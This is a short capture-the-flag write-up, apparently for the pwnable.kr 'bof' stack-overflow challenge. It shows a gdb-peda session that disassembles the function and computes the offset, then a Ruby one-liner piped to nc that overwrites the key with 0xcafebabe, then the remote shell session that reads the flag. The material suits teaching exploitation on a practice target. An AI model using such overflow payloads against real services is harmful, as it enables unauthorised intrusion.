
```
gdb-peda$ disas func
Dump of assembler code for function func:
   0x0000000100000ec0 <+0>:	push   rbp
   0x0000000100000ec1 <+1>:	mov    rbp,rsp
   0x0000000100000ec4 <+4>:	sub    rsp,0x50
   0x0000000100000ec8 <+8>:	lea    rax,[rip+0xcb]        # 0x100000f9a
   0x0000000100000ecf <+15>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000100000ed2 <+18>:	mov    rdi,rax
   0x0000000100000ed5 <+21>:	mov    al,0x0
   0x0000000100000ed7 <+23>:	call   0x100000f60
   0x0000000100000edc <+28>:	lea    rdi,[rbp-0x30]
   0x0000000100000ee0 <+32>:	mov    DWORD PTR [rbp-0x34],eax
   0x0000000100000ee3 <+35>:	call   0x100000f5a
   0x0000000100000ee8 <+40>:	cmp    DWORD PTR [rbp-0x4],0xcafebabe
   0x0000000100000eef <+47>:	mov    QWORD PTR [rbp-0x40],rax
   0x0000000100000ef3 <+51>:	jne    0x100000f0d <func+77>
   0x0000000100000ef9 <+57>:	lea    rdi,[rip+0xa9]        # 0x100000fa9
   0x0000000100000f00 <+64>:	call   0x100000f66
   0x0000000100000f05 <+69>:	mov    DWORD PTR [rbp-0x44],eax
   0x0000000100000f08 <+72>:	jmp    0x100000f1e <func+94>
   0x0000000100000f0d <+77>:	lea    rdi,[rip+0x9d]        # 0x100000fb1
   0x0000000100000f14 <+84>:	mov    al,0x0
   0x0000000100000f16 <+86>:	call   0x100000f60
   0x0000000100000f1b <+91>:	mov    DWORD PTR [rbp-0x48],eax
   0x0000000100000f1e <+94>:	add    rsp,0x50
   0x0000000100000f22 <+98>:	pop    rbp
   0x0000000100000f23 <+99>:	ret
   0x0000000100000f24 <+100>:	data16 data16 nop WORD PTR cs:[rax+rax*1+0x0]
End of assembler dump.
gdb-peda$ b *func+40
Breakpoint 1 at 0x100000ee8
gdb-peda$ r
Starting program: /Users/hojo/Desktop/ctf/pwnable/bof/a.out
warning: this program uses gets(), which is unsafe.
overflow me : AAAA
Warning: not running or target is remote

Breakpoint 1, 0x0000000100000ee8 in func ()
gdb-peda$ p $rbp-0x4
$1 = (void *) 0x7fff5fbff66c
gdb-peda$ x/30 $rsp
0x7fff5fbff620:	0x5fbff6a0	0x7fff	0x5fbff6a0	0x7fff
0x7fff5fbff630:	0x1	0x0	0x5fbff6b8	0xe
0x7fff5fbff640:	0x41414141	0x0	0x0	0x0
0x7fff5fbff650:	0x5fbff6c8	0x7fff	0x0	0x0
0x7fff5fbff660:	0x0	0x0	0x0	0xdeadbeef
0x7fff5fbff670:	0x5fbff690	0x7fff	0xf52	0x1
0x7fff5fbff680:	0x5fbff6b8	0x7fff	0x1	0x0
0x7fff5fbff690:	0x5fbff6a8	0x7fff
gdb-peda$ p/x 0x7fff5fbff66c - 0x7fff5fbff640
$2 = 0x2c
gdb-peda$ p 0x2c + 8
$3 = 0x34
```

keyまでの距離($rbp-0x4  -  $rsp + 0x20) = 0x2c + cafebabeバイト(0x8) -> 0x34字分埋める


```
$ (ruby -e 'print "A"*0x34 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000

ls -la
total 17964
drwxr-x---  3 root bof      4096 Sep 12 12:12 .
dr-xr-xr-x 66 root root     4096 Jul 13 06:44 ..
d---------  2 root root     4096 Jun 12  2014 .bash_history
-r-xr-x---  1 root bof      7348 Sep 12 12:11 bof
-rw-r--r--  1 root root      308 Sep 12 12:12 bof.c
-r--r-----  1 root bof        32 Jun 11  2014 flag
-rw-------  1 root bof  18356118 Sep 30 00:27 log
-rwx------  1 root bof       760 Sep 10  2014 super.pl
cat flag
daddy, I just pwned a buFFer :)
exit
*** stack smashing detected ***: /home/bof/bof terminated

```
